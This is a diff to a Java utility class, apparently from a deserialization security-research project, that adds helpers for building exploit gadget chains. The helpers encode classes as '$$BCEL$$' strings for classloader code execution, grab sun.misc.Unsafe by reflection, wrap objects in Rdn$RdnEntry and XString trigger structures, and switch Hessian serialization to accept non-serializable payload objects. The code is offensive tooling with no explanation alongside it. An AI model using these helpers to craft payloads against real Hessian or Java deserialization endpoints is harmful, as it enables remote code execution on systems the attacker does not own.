@@ -2,12 +2,19 @@ package com.javasec.utils;
 
 import com.caucho.hessian.io.Hessian2Input;
 import com.caucho.hessian.io.Hessian2Output;
+import com.caucho.hessian.io.Serializer;
+import com.caucho.hessian.io.SerializerFactory;
+import com.sun.org.apache.bcel.internal.Repository;
+import com.sun.org.apache.bcel.internal.classfile.JavaClass;
+import com.sun.org.apache.bcel.internal.classfile.Utility;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xpath.internal.objects.XString;
 import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtConstructor;
 import javassist.CtMethod;
+import sun.misc.Unsafe;
 import sun.reflect.ReflectionFactory;
 
 import java.io.*;
@@ -113,6 +120,12 @@ public class SerializeUtils {
     public static void LoadBcel(String code) throws Exception {
         new ClassLoader().loadClass(code).newInstance();
     }
+    public static  String makeBcelStr(Class c) throws Exception{
+        JavaClass javaClass= Repository.lookupClass(c);
+        String code= Utility.encode(javaClass.getBytes(),true);
+        code="$$BCEL$$"+code;
+        return code;
+    }
     public static TreeSet makeTreeSet(Object v1, Object v2) throws Exception {
         TreeMap<Object,Object> m = new TreeMap<>();
         setFieldValue(m, "size", 2);
@@ -144,6 +157,17 @@ public class SerializeUtils {
         setFieldValue(templatesImpl, "_name", "boogipop");
         setFieldValue(templatesImpl, "_tfactory", null);
         return templatesImpl;
+    }
+    public static byte[] getFileBytes(String filepath)throws Exception{
+        byte[] code= Files.readAllBytes(Paths.get(filepath));
+        return code;
+    }
+    public static Unsafe getUnsafe() throws NoSuchFieldException, IllegalAccessException {
+        Field field = Unsafe.class.getDeclaredField("theUnsafe");
+        //私有属性可以访问
+        field.setAccessible(true);
+        Unsafe unsafe = (Unsafe) field.get(null);
+        return unsafe;
     }
     public static Templates getTemplateByclass(String classpath) throws  Exception{
         byte[] code= Files.readAllBytes(Paths.get(classpath));
@@ -217,6 +241,17 @@ public class SerializeUtils {
         out.flushBuffer();
         return baos;
     }
+    public static Object makeTreeSetWithXString(Object obj) throws Exception {
+        Object rdnEntry1 = SerializeUtils.newInstance("javax.naming.ldap.Rdn$RdnEntry", null);
+        SerializeUtils.setFieldValue(rdnEntry1, "type", "ysomap");
+        SerializeUtils.setFieldValue(rdnEntry1, "value", new XString("test"));
+
+        Object rdnEntry2 = SerializeUtils.newInstance("javax.naming.ldap.Rdn$RdnEntry", null);
+        SerializeUtils.setFieldValue(rdnEntry2, "type", "ysomap");
+        SerializeUtils.setFieldValue(rdnEntry2, "value", obj);
+
+        return SerializeUtils.makeTreeSet(rdnEntry2, rdnEntry1);
+    }
     public static void HessianDeserial(ByteArrayOutputStream out) throws Exception{
         ByteArrayInputStream bais = new ByteArrayInputStream(out.toByteArray());
         Hessian2Input input = new Hessian2Input(bais);
@@ -225,9 +260,11 @@ public class SerializeUtils {
     public static String HessianSerial(Object o) throws Exception{
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
         Hessian2Output oos = new Hessian2Output(baos);
+        SerializerFactory serializerFactory = oos.getSerializerFactory();
+        oos.setSerializerFactory(serializerFactory);
+        serializerFactory.setAllowNonSerializable(true);
         oos.writeObject(o);
         oos.close();
-
         String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());
         return base64String;
     }
